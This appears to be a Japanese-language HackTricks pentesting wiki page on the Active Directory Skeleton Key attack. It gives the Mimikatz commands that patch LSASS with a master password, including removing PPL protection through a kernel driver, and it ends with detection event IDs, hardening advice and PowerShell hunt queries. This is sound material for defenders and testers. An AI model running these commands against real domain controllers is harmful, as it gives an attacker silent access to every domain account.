# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

**Skeleton Key attack**は、各ドメインコントローラーのLSASSプロセスに**マスターパスワードを注入**することで、攻撃者が**Active Directory認証をバイパス**できるtechniqueです。注入後は、マスターパスワード（デフォルトでは **`mimikatz`**）を使用して、**任意のドメインユーザー**として認証できます。このとき、ユーザーの実際のパスワードも引き続き使用できます。<sup>[[1]](#references)[[2]](#references)</sup>

主な事実：

- すべてのDCで**Domain Admin/SYSTEM + SeDebugPrivilege**が必要で、**再起動のたびに再適用**する必要があります。<sup>[[2]](#references)</sup>
- Classic Mimikatz実装は、**NTLM**および**Kerberos RC4 (etype 0x17)**の検証パスにpatchを適用します。AES-only認証では、RC4 hook経由のそのskeleton passwordは**受け入れられません**。<sup>[[2]](#references)</sup>
- サードパーティ製のLSA authentication packageや、追加のsmart-card / MFA providerと競合する可能性があります。<sup>[[2]](#references)</sup>
- Mimikatz moduleは、互換性の問題がある場合にKerberos/AES hookへの変更を避けるため、オプションのswitch `/letaes`を受け付けます。<sup>[[3]](#references)</sup>

### 実行

Classicで、PPLによって保護されていないLSASS：
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
**LSASS が protected process light (PPL) として実行されている場合**、user-mode からの debug access はブロックされます。以下の従来の Mimikatz の手順では、kernel driver をロードして保護を解除した後、LSASS にパッチを適用します。Credential Guard は別の isolation control であり、PPL の同義語として使用しないでください。<sup>[[3]](#references)[[4]](#references)</sup>
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
インジェクション後、任意のドメインアカウントで認証しますが、パスワードには `mimikatz`（またはオペレーターが設定した値）を使用します。複数の DC がある環境では、**すべての DC** で繰り返し実行することを忘れないでください。

## Mitigations

- **ログ監視**
- unsigned driver などの `mimidrv.sys` のインストールに対する System **Event ID 7045**（service/driver install）。
- **Sysmon**: `mimidrv.sys` の driver load に対する Event ID 7、および non-system process からの `lsass.exe` への不審なアクセスに対する Event ID 10。
- sensitive privilege の使用または LSA authentication package の登録異常に対する Security **Event ID 4673/4611**。DC から RC4（etype 0x17）を使用した、予期しない 4624 logon と相関分析します。
- **LSASS の hardening**
- サポートされている環境では、**RunAsPPL** と **Credential Guard** を有効に保ちます。これらは異なる保護を提供し、組み合わせることで LSASS の secret を変更または抽出する試みに必要なコストと telemetry を高めます。<sup>[[4]](#references)</sup>
- 可能な場合は legacy **RC4** を無効化します。AES に限定された Kerberos ticket により、skeleton key が使用する RC4 hook path を防止できます。<sup>[[2]](#references)</sup>
- 簡易 PowerShell hunt:
- unsigned kernel driver のインストールを検出: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Mimikatz driver を hunt: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- reboot 後に PPL が enforced されていることを検証: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

credential hardening に関する追加の guidance については、[Windows credentials protections](../stealing-credentials/credentials-protections.md) を確認してください。

## References

- [1] [Netwrix – Active Directory における Skeleton Key attack（2022）](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [2] [TheHacker.recipes – Skeleton key（2026）](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [3] [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)
- [4] [Microsoft Learn — 追加の LSA protection の構成](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
